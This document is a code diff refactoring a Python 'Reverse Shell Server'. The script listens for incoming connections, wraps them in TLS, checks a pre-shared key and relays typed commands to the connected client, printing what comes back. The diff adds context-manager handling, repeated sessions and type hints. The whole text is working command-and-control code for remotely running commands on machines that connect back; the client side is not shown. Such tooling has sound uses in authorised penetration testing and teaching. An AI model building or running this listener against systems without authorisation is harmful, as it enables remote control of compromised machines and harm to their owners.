@@ -1,3 +1,10 @@
+#!/usr/bin/env python3
+"""
+Reverse Shell Server
+--------------------
+This server listens for incoming client connections,
+and allows the user to forward commands to them.
+"""
 import socket
 import ssl
 import sys
@@ -22,10 +29,9 @@ class SocketServer:
     accepts one connection, and sends commands to the connected client.
     """
 
-    def __init__(self, host="0.0.0.0", port=args.port):
+    def __init__(self, host: str = "0.0.0.0", port: int = args.port) -> None:
         """
-        Initialize the server with a host and port.
-        Initializes the TLS context
+        Set up the server with a host and port. Set up the TLS context.
         """
         self.host = host
         self.port = port
@@ -33,110 +39,127 @@ class SocketServer:
 
         self.tls_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         self.tls_context.load_cert_chain(
-            certfile=args.public_key_path, keyfile=args.private_key_path)
+            certfile=args.public_key_path,
+            keyfile=args.private_key_path
+        )
 
-    def create_socket(self):
+    def __enter__(self):
+        """
+        Create the socket and bind it to the host and port
+        when entering the context manager.
+        """
+        try:
+            self.create_socket()
+            self.bind_socket()
+        except Exception as error:
+            print(f"Socket creation or binding error: {error}")
+            sys.exit(1)
+        return self
+
+    def __exit__(self, exc_type, exc_value, traceback):
+        """
+        Close the socket when exiting the context manager.
+        """
+        if self.socket:
+            self.socket.close()
+
+    def create_socket(self) -> None:
         """
         Create the socket for the server.
         """
-        try:
-            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            print("Socket created successfully.")
-        except socket.error as error:
-            print(f"Socket creation error: {error}")
-            sys.exit(1)
+        print("Creating socket...")
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        print("Socket created successfully.")
 
-    def bind_socket(self):
+    def bind_socket(self) -> None:
         """
         Bind the socket to the host and port, and start listening for connections.
         """
-        try:
-            print(f"Binding to port: {self.port}")
-            self.socket.bind((self.host, self.port))
-            self.socket.listen(5)
-            print("Socket is now listening for connections.")
-        except socket.error as error:
-            print(f"Socket binding error: {error}")
-            sys.exit(1)
+        print(f"Binding to port {self.port}...")
+        self.socket.bind((self.host, self.port))
+        self.socket.listen(5)
+        print("Socket bound successfully.")
 
-    def accept_connection(self):
+    def accept_connection(self) -> None:
         """
         Accept an incoming connection and handle communication.
         """
-        try:
-            conn, address = self.socket.accept()
-            print(
-                f"Connection established with IP: {address[0]} on Port: {address[1]}")
-            # Use TLS context from before
-            conn = self.tls_context.wrap_socket(conn, server_side=True)
-            print("TLS Handshake completed.")
-            # Client auth
-            self.check_client_password(conn)
-
-            # Handle Ctrl+C, Ctrl+D
-            try:
-                self.send_commands(conn)
-            except KeyboardInterrupt:
-                print("Exiting.")
-                self.socket.close()
-            except EOFError:
-                print("Exiting.")
-                self.socket.close()
-
-            conn.close()
-        except socket.error as error:
-            print(f"Error accepting connection: {error}")
-
-    def send_commands(self, conn):
-        """
-        Send commands to the connected client.
-        Type 'quit' to end the session.
-        """
         while True:
-            command = input("Enter command: ")
-            if command.lower() in ["quit", "exit"]:
-                print("Closing connection and shutting down server.")
-                conn.close()
-                self.socket.close()
-                sys.exit(0)
-            elif command.strip():
-                try:
-                    conn.send(command.encode())
-                    client_response = conn.recv(1024).decode('utf-8')
-                    print(client_response, end="")
-                except socket.error as error:
-                    print(f"Error during communication: {error}")
-                    conn.close()
+            try:
+                self.socket.settimeout(1)
+                client, address = self.socket.accept()
+                break
+            except socket.timeout:
+                pass
+
+        print(f"Connection with {address[0]}:{address[1]} established.")
+
+        try:
+            # Wrap the socket with TLS
+            with self.tls_context.wrap_socket(client, server_side=True) as client:
+                print("TLS Handshake completed.")
+
+                # Authenticate the client using a pre-shared key (PSK)
+                print("Waiting for PSK from client...")
+                if not self.client_authenticated(client):
+                    print("Invalid PSK. Client could not be authenticated.")
+                    return
+                print("Valid PSK received. Client authenticated.")
+
+                self.send_commands(client)
+        finally:
+            print(f"\nConnection with {address[0]}:{address[1]} closed.")
+            self.socket.settimeout(None)
+
+    def send_commands(self, conn: ssl.SSLSocket):
+        """
+        Send commands to the connected client
+        until the session is closed by any side.
+        Type 'quit' or 'exit' to end the current session.
+        """
+        print("You can now send commands to the client.")
+        print("Type 'quit' or 'exit' to end the current session.")
+        while True:
+            try:
+                command = None
+                while not command:
+                    command = input("Enter command: ")
+
+                if command.lower() in ["quit", "exit"]:
                     break
 
-    def check_client_password(self, conn):
+                # Send the command to the client, receive the response and display it
+                conn.send(command.encode())
+                client_response = conn.recv(1024).decode('utf-8')
+                if not client_response:
+                    print("Client disconnected.")
+                    break
+                print(client_response, end="")
+            except socket.timeout:
+                pass
+
+    def client_authenticated(self, conn: ssl.SSLSocket):
         """
-        After the TLS handshake, the first thing the client needs to do is to
-        send the PSK. If incorrect, connection is closed.
+        Check if the client provided the correct pre-shared key (PSK).
         """
         psk = conn.recv(1024).decode()
-        if psk != args.password:
-            conn.close()
-            self.socket.close()
-            raise Exception(
-                "Invalid PSK. Is the client the real one? Exiting.")
-        print("Client authenticated correctly using PSK.")
+        return psk == args.password
 
 
 def main():
-    server = SocketServer()
-    server.create_socket()
-    server.bind_socket()
-
-    # Handle Ctrl+C, Ctrl+D
-    try:
-        server.accept_connection()
-    except KeyboardInterrupt:
-        print("Exiting.")
-        server.socket.close()
-    except EOFError:
-        print("Exiting.")
-        server.socket.close()
+    with SocketServer() as server:
+        print("Server started.")
+        print("You can stop the server whenever with Ctrl+C or Ctrl+D.")
+        while True:
+            print("Waiting for incoming connections...")
+            try:
+                server.accept_connection()
+            # Handle Ctrl+C, Ctrl+D
+            except KeyboardInterrupt:
+                print("Exiting.")
+                break
+            except:
+                pass
 
 
 if __name__ == "__main__":
